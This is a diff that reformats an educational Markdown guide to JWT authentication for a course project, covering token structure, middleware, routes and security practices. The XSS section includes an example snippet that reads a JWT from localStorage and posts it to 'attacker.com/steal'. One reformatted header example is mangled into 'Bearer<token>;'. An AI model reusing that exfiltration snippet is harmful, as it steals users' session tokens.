@@ -5,6 +5,7 @@ A comprehensive educational guide to understanding and implementing JWT (JSON We
 > **💡 Related Code**: See implementations in [`/src/core/middleware/jwt.ts`](https://github.com/cfb3/TCSS-460-auth-squared/blob/main/src/core/middleware/jwt.ts), [`/src/controllers/authController.ts`](https://github.com/cfb3/TCSS-460-auth-squared/blob/main/src/controllers/authController.ts), and [`/src/core/utilities/tokenUtils.ts`](https://github.com/cfb3/TCSS-460-auth-squared/blob/main/src/core/utilities/tokenUtils.ts)
 
 ## Quick Navigation
+
 - 🔐 **Login Endpoint**: `POST /auth/login` - Authenticate and receive JWT token
 - 📝 **Register Endpoint**: `POST /auth/register` - Create account and receive JWT token
 - 🛡️ **Protected Routes**: `/auth/user/*` - Routes requiring JWT authentication
@@ -42,11 +43,13 @@ A comprehensive educational guide to understanding and implementing JWT (JSON We
 Imagine you're at an amusement park:
 
 **Traditional Sessions (Without JWT)**:
+
 - You buy a ticket at the entrance (login)
 - Every time you want to ride an attraction, you go back to the entrance to verify your ticket (database lookup)
 - This creates long lines and is inefficient
 
 **JWT Authentication**:
+
 - You buy a ticket at the entrance (login) and receive a special **wristband with a tamper-proof seal** (JWT)
 - The wristband has your name, access level, and expiration date encoded on it
 - Each attraction just checks your wristband (verify signature) without calling back to the entrance
@@ -55,6 +58,7 @@ Imagine you're at an amusement park:
 ### Why Use JWT?
 
 **✅ Advantages**:
+
 1. **Stateless** - Server doesn't need to store session data (no database lookups)
 2. **Scalable** - Works perfectly with microservices and distributed systems
 3. **Self-contained** - All user information is in the token itself
@@ -62,6 +66,7 @@ Imagine you're at an amusement park:
 5. **Standard** - RFC 7519 means wide support across languages and frameworks
 
 **⚠️ Considerations**:
+
 1. **Cannot be revoked** - Valid until expiration (unless you implement a token blacklist)
 2. **Size** - Larger than simple session IDs (typically 200-500 bytes)
 3. **Secret management** - The secret key must be kept secure
@@ -89,8 +94,8 @@ Let's break down each part:
 
 ```json
 {
-  "alg": "HS256",
-  "typ": "JWT"
+    "alg": "HS256",
+    "typ": "JWT"
 }
 ```
 
@@ -105,19 +110,21 @@ This header is **Base64URL-encoded** to create the first part of the token.
 
 ```json
 {
-  "id": 123,
-  "email": "user@example.com",
-  "role": 1,
-  "iat": 1709557200,
-  "exp": 1710766800
+    "id": 123,
+    "email": "user@example.com",
+    "role": 1,
+    "iat": 1709557200,
+    "exp": 1710766800
 }
 ```
 
 **Standard Claims** (defined by RFC 7519):
+
 - **`iat`** (issued at) - Unix timestamp when token was created
 - **`exp`** (expiration) - Unix timestamp when token expires
 
 **Custom Claims** (specific to TCSS-460-auth-squared):
+
 - **`id`** - Account ID from the database
 - **`email`** - User's email address
 - **`role`** - User's role (1=User, 2=Moderator, 3=Admin, 4=SuperAdmin, 5=Owner)
@@ -132,12 +139,13 @@ The signature ensures the token hasn't been tampered with. It's created using:
 
 ```javascript
 HMACSHA256(
-  base64UrlEncode(header) + "." + base64UrlEncode(payload),
-  JWT_SECRET
-)
+    base64UrlEncode(header) + '.' + base64UrlEncode(payload),
+    JWT_SECRET
+);
 ```
 
 **How it works**:
+
 1. Take the encoded header and payload
 2. Combine them with a dot (`.`)
 3. Sign this string using HMAC-SHA256 with your **secret key**
@@ -150,6 +158,7 @@ HMACSHA256(
 ### Decoding vs Verifying
 
 **Decoding** (anyone can do this):
+
 ```bash
 # Using jwt.io or any base64 decoder
 echo "eyJpZCI6MTIzLCJlbWFpbCI6InVzZXJAZXhhbXBsZS5jb20iLCJyb2xlIjoxfQ" | base64 -d
@@ -157,6 +166,7 @@ echo "eyJpZCI6MTIzLCJlbWFpbCI6InVzZXJAZXhhbXBsZS5jb20iLCJyb2xlIjoxfQ" | base64 -
 ```
 
 **Verifying** (requires the secret key):
+
 ```typescript
 // Only the server with JWT_SECRET can verify the signature
 jwt.verify(token, process.env.JWT_SECRET);
@@ -212,21 +222,24 @@ jwt.verify(token, process.env.JWT_SECRET);
 ### Token Lifecycle in TCSS-460-auth-squared
 
 **Generation**: 14-day expiration for access tokens
+
 - Login: `POST /auth/login`
 - Registration: `POST /auth/register`
 
 **Validation**: Every protected route
+
 - Middleware: `checkToken()` in `/src/core/middleware/jwt.ts`
 - Applied to: All routes under `/auth/user/*`
 
 **Claims Structure**:
+
 ```typescript
 {
-  id: number;        // Account_ID from database
-  email: string;     // User's email
-  role: number;      // Account_Role (1-5)
-  iat: number;       // Issued at timestamp
-  exp: number;       // Expiration timestamp
+    id: number; // Account_ID from database
+    email: string; // User's email
+    role: number; // Account_Role (1-5)
+    iat: number; // Issued at timestamp
+    exp: number; // Expiration timestamp
 }
 ```
 
@@ -332,16 +345,17 @@ The critical lines (133-141) use the `jsonwebtoken` library:
 ```typescript
 const token = jwt.sign(
     {
-        id: account.account_id,      // Payload: User ID
-        email: account.email,         // Payload: Email
-        role: account.account_role    // Payload: Role
+        id: account.account_id, // Payload: User ID
+        email: account.email, // Payload: Email
+        role: account.account_role, // Payload: Role
     },
-    jwtSecret,                        // Secret key from environment
-    { expiresIn: '14d' }             // Options: 14-day expiration
+    jwtSecret, // Secret key from environment
+    { expiresIn: '14d' } // Options: 14-day expiration
 );
 ```
 
 **What `jwt.sign()` does**:
+
 1. Creates the header: `{ "alg": "HS256", "typ": "JWT" }`
 2. Creates the payload with your data + `iat` (issued at) and `exp` (expiration)
 3. Encodes header and payload as base64
@@ -373,7 +387,7 @@ export const generateAccessToken = (payload: AccessTokenPayload): string => {
         {
             id: payload.id,
             email: payload.email,
-            role: payload.role
+            role: payload.role,
         },
         jwtSecret,
         { expiresIn: '14d' }
@@ -382,17 +396,19 @@ export const generateAccessToken = (payload: AccessTokenPayload): string => {
 ```
 
 **Usage in registration** (Line 61 in authController.ts):
+
 ```typescript
 const token = generateAccessToken({
     id: accountId,
     email,
-    role: 1
+    role: 1,
 });
 ```
 
 ### Example: Login Request/Response
 
 **Request**:
+
 ```bash
 curl -X POST http://localhost:8000/auth/login \
   -H "Content-Type: application/json" \
@@ -403,25 +419,26 @@ curl -X POST http://localhost:8000/auth/login \
 ```
 
 **Response**:
+
 ```json
 {
-  "success": true,
-  "message": "Login successful",
-  "data": {
-    "accessToken": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MTIsImVtYWlsIjoic3R1ZGVudEB1dy5lZHUiLCJyb2xlIjoxLCJpYXQiOjE3MDk1NTcyMDAsImV4cCI6MTcxMDc2NjgwMH0.1234567890abcdefghijklmnopqrstuvwxyz",
-    "user": {
-      "id": 12,
-      "email": "student@uw.edu",
-      "name": "John",
-      "lastname": "Doe",
-      "username": "johndoe",
-      "role": "User",
-      "emailVerified": true,
-      "phoneVerified": false,
-      "accountStatus": "active"
-    }
-  },
-  "timestamp": "2024-03-04T10:30:00.000Z"
+    "success": true,
+    "message": "Login successful",
+    "data": {
+        "accessToken": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MTIsImVtYWlsIjoic3R1ZGVudEB1dy5lZHUiLCJyb2xlIjoxLCJpYXQiOjE3MDk1NTcyMDAsImV4cCI6MTcxMDc2NjgwMH0.1234567890abcdefghijklmnopqrstuvwxyz",
+        "user": {
+            "id": 12,
+            "email": "student@uw.edu",
+            "name": "John",
+            "lastname": "Doe",
+            "username": "johndoe",
+            "role": "User",
+            "emailVerified": true,
+            "phoneVerified": false,
+            "accountStatus": "active"
+        }
+    },
+    "timestamp": "2024-03-04T10:30:00.000Z"
 }
 ```
 
@@ -461,19 +478,23 @@ export const checkToken = (
         }
 
         // STEP 3: Verify signature and decode payload
-        jwt.verify(token, process.env.JWT_SECRET, (error, decoded: JwtPayload) => {
-            if (error) {
-                // Signature invalid or token expired
-                response.status(403).json({
-                    success: false,
-                    message: 'Token is not valid',
-                });
-            } else {
-                // Token is valid - attach claims to request
-                request.claims = decoded as IJwtClaims;
-                next();  // Continue to route handler
+        jwt.verify(
+            token,
+            process.env.JWT_SECRET,
+            (error, decoded: JwtPayload) => {
+                if (error) {
+                    // Signature invalid or token expired
+                    response.status(403).json({
+                        success: false,
+                        message: 'Token is not valid',
+                    });
+                } else {
+                    // Token is valid - attach claims to request
+                    request.claims = decoded as IJwtClaims;
+                    next(); // Continue to route handler
+                }
             }
-        });
+        );
     } else {
         // No token provided
         response.status(401).json({
@@ -489,6 +510,7 @@ export const checkToken = (
 **Step 1: Extract Token from Headers**
 
 The middleware checks two possible headers:
+
 - `x-access-token`: Custom header (legacy support)
 - `authorization`: Standard HTTP header (preferred)
 
@@ -501,11 +523,13 @@ let token: string =
 **Step 2: Remove Bearer Prefix**
 
 Standard JWT format uses "Bearer" prefix:
+
 ```
 Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
 ```
 
 The middleware strips this prefix:
+
 ```typescript
 if (token.startsWith('Bearer ')) {
     token = token.slice(7, token.length);
@@ -515,6 +539,7 @@ if (token.startsWith('Bearer ')) {
 **Step 3: Verify and Decode**
 
 The magic happens with `jwt.verify()`:
+
 ```typescript
 jwt.verify(token, process.env.JWT_SECRET, (error, decoded: JwtPayload) => {
     if (error) {
@@ -532,6 +557,7 @@ jwt.verify(token, process.env.JWT_SECRET, (error, decoded: JwtPayload) => {
 ```
 
 **What `jwt.verify()` does**:
+
 1. Decodes the header and payload
 2. Recreates the signature using JWT_SECRET
 3. Compares signatures (constant-time comparison to prevent timing attacks)
@@ -545,22 +571,24 @@ jwt.verify(token, process.env.JWT_SECRET, (error, decoded: JwtPayload) => {
 The middleware returns different status codes:
 
 - **401 Unauthorized**: Token not provided
-  ```json
-  {
-    "success": false,
-    "message": "Auth token is not supplied"
-  }
-  ```
+
+    ```json
+    {
+        "success": false,
+        "message": "Auth token is not supplied"
+    }
+    ```
 
 - **403 Forbidden**: Token invalid or expired
-  ```json
-  {
-    "success": false,
-    "message": "Token is not valid"
-  }
-  ```
+    ```json
+    {
+        "success": false,
+        "message": "Token is not valid"
+    }
+    ```
 
 **Why different codes?**
+
 - **401**: "You need to authenticate" (no token)
 - **403**: "Your authentication is invalid" (bad token)
 
@@ -576,19 +604,20 @@ export interface IJwtClaims {
     id: number;
     email: string;
     role: UserRole;
-    iat?: number;  // Issued at (optional, added automatically by jwt.sign())
-    exp?: number;  // Expiration (optional, added automatically by jwt.sign())
+    iat?: number; // Issued at (optional, added automatically by jwt.sign())
+    exp?: number; // Expiration (optional, added automatically by jwt.sign())
 }
 
 // Extended Request type for TypeScript - adds claims property
 export interface IJwtRequest extends Request {
-    claims?: IJwtClaims;  // Populated by checkToken middleware
+    claims?: IJwtClaims; // Populated by checkToken middleware
 }
 ```
 
 **Why IJwtRequest?** When using TypeScript, the standard Express `Request` type doesn't know about the `claims` property we add in our middleware. The `IJwtRequest` interface extends `Request` to tell TypeScript that `request.claims` exists and is type-safe.
 
 **Usage in Route Handlers**:
+
 ```typescript
 // Note: Using IJwtRequest instead of Request for TypeScript type safety
 static async changePassword(request: IJwtRequest, response: Response) {
@@ -611,16 +640,17 @@ Understanding what data goes into JWT tokens is crucial for building secure auth
 ### TCSS-460-auth-squared Token Payload
 
 **Complete Structure**:
+
 ```typescript
 {
-  // Custom Claims (application-specific)
-  id: number;           // Account_ID from database
-  email: string;        // User's email address
-  role: number;         // User's role (1-5)
+    // Custom Claims (application-specific)
+    id: number; // Account_ID from database
+    email: string; // User's email address
+    role: number; // User's role (1-5)
 
-  // Standard JWT Claims (added automatically)
-  iat: number;          // Issued At - Unix timestamp when token was created
-  exp: number;          // Expiration - Unix timestamp when token expires
+    // Standard JWT Claims (added automatically)
+    iat: number; // Issued At - Unix timestamp when token was created
+    exp: number; // Expiration - Unix timestamp when token expires
 }
 ```
 
@@ -628,45 +658,51 @@ Understanding what data goes into JWT tokens is crucial for building secure auth
 
 While TCSS-460-auth-squared only uses `iat` and `exp`, here are other standard claims:
 
-| Claim | Name | Description | Example |
-|-------|------|-------------|---------|
-| `iss` | Issuer | Who created the token | `"auth.tcss460.com"` |
-| `sub` | Subject | Subject identifier (often user ID) | `"123"` |
-| `aud` | Audience | Who the token is intended for | `"api.tcss460.com"` |
-| `exp` | Expiration | When the token expires | `1710766800` |
-| `nbf` | Not Before | Token not valid before this time | `1709557200` |
-| `iat` | Issued At | When the token was created | `1709557200` |
-| `jti` | JWT ID | Unique identifier for the token | `"abc123"` |
+| Claim | Name       | Description                        | Example              |
+| ----- | ---------- | ---------------------------------- | -------------------- |
+| `iss` | Issuer     | Who created the token              | `"auth.tcss460.com"` |
+| `sub` | Subject    | Subject identifier (often user ID) | `"123"`              |
+| `aud` | Audience   | Who the token is intended for      | `"api.tcss460.com"`  |
+| `exp` | Expiration | When the token expires             | `1710766800`         |
+| `nbf` | Not Before | Token not valid before this time   | `1709557200`         |
+| `iat` | Issued At  | When the token was created         | `1709557200`         |
+| `jti` | JWT ID     | Unique identifier for the token    | `"abc123"`           |
 
 ### Custom Claims in TCSS-460-auth-squared
 
 **1. User ID (`id`)**
+
 ```typescript
-id: account.account_id  // e.g., 123
+id: account.account_id; // e.g., 123
 ```
+
 - Primary key from `Account` table
 - Used to identify the user without database lookups
 - Essential for authorization checks
 
 **2. Email (`email`)**
+
 ```typescript
-email: account.email  // e.g., "student@uw.edu"
+email: account.email; // e.g., "student@uw.edu"
 ```
+
 - User's email address
 - Useful for audit logging
 - Can be displayed in UI without additional queries
 
 **3. Role (`role`)**
+
 ```typescript
-role: account.account_role  // e.g., 1, 2, 3, 4, or 5
+role: account.account_role; // e.g., 1, 2, 3, 4, or 5
 ```
+
 - Determines user permissions
 - Maps to role hierarchy:
-  - `1` = User (default)
-  - `2` = Moderator
-  - `3` = Admin
-  - `4` = SuperAdmin
-  - `5` = Owner
+    - `1` = User (default)
+    - `2` = Moderator
+    - `3` = Admin
+    - `4` = SuperAdmin
+    - `5` = Owner
 
 ### Token Types in TCSS-460-auth-squared
 
@@ -675,6 +711,7 @@ role: account.account_role  // e.g., 1, 2, 3, 4, or 5
 The system uses multiple token types for different purposes:
 
 **1. Access Tokens** (14-day expiration)
+
 ```typescript
 // File: /src/core/utilities/tokenUtils.ts (lines 20-32)
 export const generateAccessToken = (payload: AccessTokenPayload): string => {
@@ -684,10 +721,10 @@ export const generateAccessToken = (payload: AccessTokenPayload): string => {
         {
             id: payload.id,
             email: payload.email,
-            role: payload.role
+            role: payload.role,
         },
         jwtSecret,
-        { expiresIn: '14d' }  // Long-lived for user sessions
+        { expiresIn: '14d' } // Long-lived for user sessions
     );
 };
 ```
@@ -697,20 +734,24 @@ export const generateAccessToken = (payload: AccessTokenPayload): string => {
 **Purpose:** Allows users to stay logged in for 14 days without re-authenticating. Contains full user identity (id, email, role) for authorization decisions.
 
 **2. Password Reset Tokens** (15-minute expiration)
+
 ```typescript
 // File: /src/core/utilities/tokenUtils.ts (lines 37-50)
-export const generatePasswordResetToken = (userId: number, email: string): string => {
+export const generatePasswordResetToken = (
+    userId: number,
+    email: string
+): string => {
     const jwtSecret = getEnvVar('JWT_SECRET');
 
     return jwt.sign(
         {
             id: userId,
             email,
-            type: 'password_reset',  // Identifies token type
-            timestamp: Date.now()
+            type: 'password_reset', // Identifies token type
+            timestamp: Date.now(),
         },
         jwtSecret,
-        { expiresIn: '15m' }  // Short-lived for security
+        { expiresIn: '15m' } // Short-lived for security
     );
 };
 ```
@@ -720,16 +761,20 @@ export const generatePasswordResetToken = (userId: number, email: string): strin
 **Purpose:** Provides time-limited authorization to reset a password. Short expiration (15 minutes) limits the window of vulnerability if the email is compromised. The `type` field prevents reusing this token as an access token.
 
 **3. Verification Tokens** (24-hour expiration)
+
 ```typescript
 // File: /src/core/utilities/tokenUtils.ts (lines 55-67)
-export const generateVerificationToken = (userId: number, type: 'email' | 'phone'): string => {
+export const generateVerificationToken = (
+    userId: number,
+    type: 'email' | 'phone'
+): string => {
     const jwtSecret = getEnvVar('JWT_SECRET');
 
     return jwt.sign(
         {
             id: userId,
             type: `${type}_verification`,
-            timestamp: Date.now()
+            timestamp: Date.now(),
         },
         jwtSecret,
         { expiresIn: '24h' }
@@ -746,6 +791,7 @@ export const generateVerificationToken = (userId: number, type: 'email' | 'phone
 ### What NOT to Put in JWT Payload
 
 ❌ **Never include**:
+
 - Passwords (even hashed)
 - Credit card numbers
 - Social Security Numbers
@@ -753,6 +799,7 @@ export const generateVerificationToken = (userId: number, type: 'email' | 'phone
 - Personally Identifiable Information (PII) beyond what's necessary
 
 ✅ **Safe to include**:
+
 - User ID
 - Email (if not considered sensitive)
 - Role/permissions
@@ -760,6 +807,7 @@ export const generateVerificationToken = (userId: number, type: 'email' | 'phone
 - Expiration information
 
 **Why?** JWT payloads are **encoded, not encrypted**. Anyone can decode them:
+
 ```bash
 # Decode JWT payload (no secret needed)
 echo "eyJpZCI6MTIzLCJlbWFpbCI6InVzZXJAZXhhbXBsZS5jb20ifQ" | base64 -d
@@ -779,7 +827,12 @@ Let's see how TCSS-460-auth-squared applies JWT authentication to protected rout
 ```typescript
 import express, { Router } from 'express';
 import { AuthController, VerificationController } from '@controllers';
-import { checkToken, validatePasswordChange, validatePhoneSend, validatePhoneVerify } from '@middleware';
+import {
+    checkToken,
+    validatePasswordChange,
+    validatePhoneSend,
+    validatePhoneVerify,
+} from '@middleware';
 
 const closedRoutes: Router = express.Router();
 
@@ -793,32 +846,40 @@ closedRoutes.use(checkToken);
  * Change password (requires authentication and old password)
  * POST /auth/user/password/change
  */
-closedRoutes.post('/auth/user/password/change',
-                  validatePasswordChange,
-                  AuthController.changePassword);
+closedRoutes.post(
+    '/auth/user/password/change',
+    validatePasswordChange,
+    AuthController.changePassword
+);
 
 /**
  * Send SMS verification code
  * POST /auth/verify/phone/send
  */
-closedRoutes.post('/auth/verify/phone/send',
-                  validatePhoneSend,
-                  VerificationController.sendSMSVerification);
+closedRoutes.post(
+    '/auth/verify/phone/send',
+    validatePhoneSend,
+    VerificationController.sendSMSVerification
+);
 
 /**
  * Verify SMS code
  * POST /auth/verify/phone/verify
  */
-closedRoutes.post('/auth/verify/phone/verify',
-                  validatePhoneVerify,
-                  VerificationController.verifySMSCode);
+closedRoutes.post(
+    '/auth/verify/phone/verify',
+    validatePhoneVerify,
+    VerificationController.verifySMSCode
+);
 
 /**
  * Send email verification
  * POST /auth/verify/email/send
  */
-closedRoutes.post('/auth/verify/email/send',
-                  VerificationController.sendEmailVerification);
+closedRoutes.post(
+    '/auth/verify/email/send',
+    VerificationController.sendEmailVerification
+);
 
 export { closedRoutes };
 ```
@@ -840,6 +901,7 @@ Response
 ```
 
 **Line 8 is critical**:
+
 ```typescript
 closedRoutes.use(checkToken);
 ```
@@ -872,9 +934,11 @@ openRoutes.post('/auth/register', validateRegister, AuthController.register);
  * Request password reset
  * POST /auth/password/reset-request
  */
-openRoutes.post('/auth/password/reset-request',
-                validatePasswordResetRequest,
-                AuthController.requestPasswordReset);
+openRoutes.post(
+    '/auth/password/reset-request',
+    validatePasswordResetRequest,
+    AuthController.requestPasswordReset
+);
 ```
 
 🎯 **Learning Objective**: Public routes (login, register) don't require JWT because users don't have tokens yet.
@@ -917,6 +981,7 @@ static async changePassword(request: IJwtRequest, response: Response): Promise<v
 ### Request Example: Protected Route
 
 **Without JWT (fails)**:
+
 ```bash
 curl -X POST http://localhost:8000/auth/user/password/change \
   -H "Content-Type: application/json" \
@@ -927,14 +992,16 @@ curl -X POST http://localhost:8000/auth/user/password/change \
 ```
 
 **Response**:
+
 ```json
 {
-  "success": false,
-  "message": "Auth token is not supplied"
+    "success": false,
+    "message": "Auth token is not supplied"
 }
 ```
 
 **With JWT (succeeds)**:
+
 ```bash
 curl -X POST http://localhost:8000/auth/user/password/change \
   -H "Content-Type: application/json" \
@@ -946,11 +1013,12 @@ curl -X POST http://localhost:8000/auth/user/password/change \
 ```
 
 **Response**:
+
 ```json
 {
-  "success": true,
-  "message": "Password changed successfully",
-  "timestamp": "2024-03-04T10:30:00.000Z"
+    "success": true,
+    "message": "Password changed successfully",
+    "timestamp": "2024-03-04T10:30:00.000Z"
 }
 ```
 
@@ -967,6 +1035,7 @@ JWT authentication is secure when implemented correctly, but there are important
 **Best Practices**:
 
 ✅ **DO**:
+
 - Store in environment variables (`.env` file)
 - Use long, random, cryptographically secure secrets (minimum 256 bits)
 - Different secrets for development, staging, and production
@@ -976,11 +1045,13 @@ JWT authentication is secure when implemented correctly, but there are important
 **In TCSS-460-auth-squared**, the secret is stored in `.env` and loaded via `src/core/utilities/envConfig.ts`:
 
 **`.env` file** (never committed to git):
+
 ```bash
 JWT_SECRET=your_super_secret_jwt_key_change_this_in_production
 ```
 
 **How it's loaded** (`src/core/utilities/envConfig.ts`):
+
 ```typescript
 export const getEnvVar = (key: string, defaultValue?: string): string => {
     const value = process.env[key];
@@ -991,18 +1062,20 @@ export const getEnvVar = (key: string, defaultValue?: string): string => {
 };
 
 // Usage in tokenUtils.ts
-const jwtSecret = getEnvVar('JWT_SECRET');  // Throws error if not set
+const jwtSecret = getEnvVar('JWT_SECRET'); // Throws error if not set
 ```
 
 **Security**: The `.env` file is listed in `.gitignore` to prevent committing secrets to version control. See [Environment Configuration Guide](./environment-configuration.md) for more details on managing environment variables.
 
 ❌ **DON'T**:
+
 - Hardcode secrets in source code
 - Commit secrets to version control (`.env` should be in `.gitignore`)
 - Share secrets in Slack, email, or documentation
 - Use simple secrets like "secret", "password", "123456"
 
 **Generating Secure Secrets**:
+
 ```bash
 # Generate 256-bit (32-byte) random secret
 node -e "console.log(require('crypto').randomBytes(32).toString('hex'))"
@@ -1016,31 +1089,40 @@ node -e "console.log(require('crypto').randomBytes(32).toString('hex'))"
 **TCSS-460-auth-squared uses 14-day expiration** for access tokens:
 
 ```typescript
-jwt.sign(payload, jwtSecret, { expiresIn: '14d' })
+jwt.sign(payload, jwtSecret, { expiresIn: '14d' });
 ```
 
 **Trade-offs**:
 
 **Short Expiration (1-24 hours)**:
+
 - ✅ More secure (limited window if token is stolen)
 - ❌ Users must re-authenticate frequently
 - ✅ Typically used with refresh tokens
 
 **Long Expiration (7-30 days)**:
+
 - ✅ Better user experience (stay logged in)
 - ❌ Longer risk window if token is stolen
 - ⚠️ Cannot revoke without additional infrastructure
 
 **Different Token Types, Different Expirations**:
+
 ```typescript
 // Access tokens - long-lived for convenience
-{ expiresIn: '14d' }
+{
+    expiresIn: '14d';
+}
 
 // Password reset - short-lived for security
-{ expiresIn: '15m' }
+{
+    expiresIn: '15m';
+}
 
 // Email verification - moderate expiration
-{ expiresIn: '24h' }
+{
+    expiresIn: '24h';
+}
 ```
 
 🎯 **Learning Objective**: Choose expiration based on token sensitivity and user experience requirements.
@@ -1050,11 +1132,13 @@ jwt.sign(payload, jwtSecret, { expiresIn: '14d' })
 **Critical**: JWTs must ONLY be transmitted over HTTPS in production.
 
 **Why?**
+
 - HTTP is unencrypted - anyone on the network can intercept tokens
 - HTTPS encrypts the entire connection
 - If JWT is stolen via HTTP, attacker can impersonate the user
 
 **In Production**:
+
 ```typescript
 // Force HTTPS in production
 if (process.env.NODE_ENV === 'production') {
@@ -1073,6 +1157,7 @@ if (process.env.NODE_ENV === 'production') {
 **Options for storing JWT on the client**:
 
 **1. localStorage** (common but has risks):
+
 ```javascript
 // Store token
 localStorage.setItem('jwt', token);
@@ -1083,8 +1168,8 @@ const token = localStorage.getItem('jwt');
 // Use in requests
 fetch('/api/protected', {
     headers: {
-        'Authorization': `Bearer ${token}`
-    }
+        Authorization: `Bearer ${token}`,
+    },
 });
 ```
 
@@ -1092,6 +1177,7 @@ fetch('/api/protected', {
 **Cons**: Vulnerable to XSS attacks (JavaScript can access it)
 
 **2. sessionStorage** (slightly more secure):
+
 ```javascript
 sessionStorage.setItem('jwt', token);
 ```
@@ -1100,12 +1186,13 @@ sessionStorage.setItem('jwt', token);
 **Cons**: Still vulnerable to XSS
 
 **3. httpOnly Cookies** (most secure for web):
+
 ```typescript
 // Server sets cookie
 res.cookie('jwt', token, {
-    httpOnly: true,    // JavaScript cannot access
-    secure: true,      // HTTPS only
-    sameSite: 'strict' // CSRF protection
+    httpOnly: true, // JavaScript cannot access
+    secure: true, // HTTPS only
+    sameSite: 'strict', // CSRF protection
 });
 ```
 
@@ -1113,6 +1200,7 @@ res.cookie('jwt', token, {
 **Cons**: Requires CSRF protection, more complex setup
 
 **4. Memory Only** (most secure but least convenient):
+
 ```javascript
 // Store in React state or similar
 const [token, setToken] = useState(null);
@@ -1128,6 +1216,7 @@ const [token, setToken] = useState(null);
 **Problem**: Once issued, a JWT is valid until expiration. You cannot "revoke" it.
 
 **Scenario**:
+
 ```
 1. User logs in → receives JWT (expires in 14 days)
 2. User's account is compromised
@@ -1138,6 +1227,7 @@ const [token, setToken] = useState(null);
 **Solutions**:
 
 **A. Short Expiration + Refresh Tokens**:
+
 ```typescript
 // Short-lived access token (15 minutes)
 const accessToken = jwt.sign(payload, secret, { expiresIn: '15m' });
@@ -1150,6 +1240,7 @@ const refreshToken = generateRefreshToken(userId);
 ```
 
 **B. Token Blacklist** (defeats stateless advantage):
+
 ```typescript
 // Store revoked tokens in database/Redis
 const revokedTokens = new Set();
@@ -1161,6 +1252,7 @@ if (revokedTokens.has(token)) {
 ```
 
 **C. Short Expiration Only** (TCSS-460-auth-squared approach):
+
 - Keep expiration reasonable (14 days)
 - Accept that compromised tokens are valid until expiration
 - Focus on prevention (HTTPS, secure storage, XSS protection)
@@ -1174,19 +1266,21 @@ if (revokedTokens.has(token)) {
 const token = localStorage.getItem('jwt');
 fetch('https://attacker.com/steal', {
     method: 'POST',
-    body: JSON.stringify({ token })
+    body: JSON.stringify({ token }),
 });
 ```
 
 **Who needs XSS protection?** The **frontend/client application** that stores and uses the JWT. While the backend (TCSS-460-auth-squared) validates inputs to prevent XSS payloads from being stored in the database, the primary XSS defense must be in the client-side code.
 
 **Protection Strategies (Client-Side)**:
+
 1. **Input Validation** - Sanitize all user input before displaying
 2. **Output Encoding** - Escape HTML when displaying user content (e.g., user names, messages)
 3. **Content Security Policy (CSP)** - HTTP header that restricts script sources
 4. **httpOnly Cookies** - Store JWT in cookies inaccessible to JavaScript (alternative to localStorage)
 
 **TCSS-460-auth-squared backend protections** (prevents storing XSS payloads):
+
 ```typescript
 body('username')
     .trim()
@@ -1204,11 +1298,13 @@ Based on TCSS-460-auth-squared implementation and industry standards.
 ### 1. Use Standard Authorization Header
 
 ✅ **Preferred**:
+
 ```typescript
-Authorization: Bearer <token>
+Authorization: Bearer<token>;
 ```
 
 ❌ **Avoid**:
+
 ```typescript
 X-Custom-Token: <token>
 ```
@@ -1218,6 +1314,7 @@ X-Custom-Token: <token>
 ### 2. Validate Token on Every Request
 
 **TCSS-460-auth-squared approach**:
+
 ```typescript
 // Apply to all protected routes
 closedRoutes.use(checkToken);
@@ -1230,6 +1327,7 @@ closedRoutes.use(checkToken);
 Only include what you need in the token payload:
 
 ✅ **Good** (TCSS-460-auth-squared):
+
 ```typescript
 {
     id: 123,
@@ -1239,6 +1337,7 @@ Only include what you need in the token payload:
 ```
 
 ❌ **Bad** (too much data):
+
 ```typescript
 {
     id: 123,
@@ -1253,6 +1352,7 @@ Only include what you need in the token payload:
 ```
 
 **Why?**
+
 - Larger tokens = more bandwidth per request
 - More data exposure if token is intercepted
 - Changed data requires new token
@@ -1273,6 +1373,7 @@ generateVerificationToken(userId, 'email');
 ```
 
 **Benefits**:
+
 - Different expiration based on sensitivity
 - Type-specific validation
 - Better security boundaries
@@ -1280,6 +1381,7 @@ generateVerificationToken(userId, 'email');
 ### 5. Validate Token Type in Critical Operations
 
 **Password reset validation** (from authController.ts, lines 283-300):
+
 ```typescript
 static async resetPassword(request: IJwtRequest, response: Response) {
     const { token, password } = request.body;
@@ -1313,24 +1415,30 @@ static async resetPassword(request: IJwtRequest, response: Response) {
 ### 6. Log Authentication Events
 
 **TCSS-460-auth-squared logging**:
+
 ```typescript
 try {
     // ... authentication logic
 } catch (error) {
     console.error('Login error:', error);
-    sendError(response, 500, 'Server error - contact support',
-             ErrorCodes.SRVR_DATABASE_ERROR);
+    sendError(
+        response,
+        500,
+        'Server error - contact support',
+        ErrorCodes.SRVR_DATABASE_ERROR
+    );
 }
 ```
 
 **Enhanced logging for production**:
+
 ```typescript
 console.log({
     event: 'login_success',
     userId: account.account_id,
     email: account.email,
     timestamp: new Date().toISOString(),
-    ip: request.ip
+    ip: request.ip,
 });
 ```
 
@@ -1345,7 +1453,7 @@ jwt.verify(token, secret, (error, decoded) => {
             // Token expired - user needs to log in again
             return res.status(401).json({
                 success: false,
-                message: 'Token expired, please log in again'
+                message: 'Token expired, please log in again',
             });
         }
 
@@ -1353,14 +1461,14 @@ jwt.verify(token, secret, (error, decoded) => {
             // Invalid token - malformed or wrong signature
             return res.status(403).json({
                 success: false,
-                message: 'Invalid token'
+                message: 'Invalid token',
             });
         }
 
         // Other errors
         return res.status(500).json({
             success: false,
-            message: 'Token verification failed'
+            message: 'Token verification failed',
         });
     }
 
@@ -1402,29 +1510,38 @@ Learn from common JWT pitfalls to build more secure applications.
 ### Mistake 1: Storing Sensitive Data in Payload
 
 ❌ **Wrong**:
+
 ```typescript
-const token = jwt.sign({
-    id: user.id,
-    email: user.email,
-    password: user.password,  // NEVER!
-    ssn: user.ssn,            // NEVER!
-    creditCard: user.card     // NEVER!
-}, secret);
+const token = jwt.sign(
+    {
+        id: user.id,
+        email: user.email,
+        password: user.password, // NEVER!
+        ssn: user.ssn, // NEVER!
+        creditCard: user.card, // NEVER!
+    },
+    secret
+);
 ```
 
 **Why it's wrong**: JWT payloads are base64-encoded, not encrypted. Anyone can decode them:
+
 ```bash
 echo "eyJwYXNzd29yZCI6InNlY3JldDEyMyJ9" | base64 -d
 # Output: {"password":"secret123"}
 ```
 
 ✅ **Correct**:
+
